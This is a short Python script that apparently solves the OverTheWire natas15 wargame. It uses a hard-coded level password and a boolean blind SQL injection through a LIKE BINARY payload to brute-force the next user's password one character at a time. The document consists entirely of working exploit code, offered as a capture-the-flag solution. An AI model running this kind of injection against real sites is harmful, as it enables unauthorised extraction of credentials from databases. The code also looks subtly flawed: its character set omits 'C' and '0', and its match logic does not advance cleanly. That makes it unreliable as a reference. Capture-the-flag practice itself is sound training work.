import requests

username = 'natas15'
password = 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
url = 'http://natas15.natas.labs.overthewire.org/index.php'
alphabet = list('abcdefghijklmnopqrstuvwxyzABDEFGHIJKLMNOPQRSTUVWXYZ123456789')
payload_var = ''
payload = '?username="natas16 AND password LIKE BINARY "'
s = requests.Session()


while(len(payload_var) != 32):
    for i in range(len(alphabet)):
        tmp = payload_var
        payload_var = payload_var + alphabet[i]
        payload_url = url + payload + payload_var + '%" #'
        r = s.get(payload_url, auth=(username, password))
        status_code = r.status_code
        text = r.text
        print(payload_url, status_code)
        if (r.text.find('Error') > 0): 
            payload_var = tmp
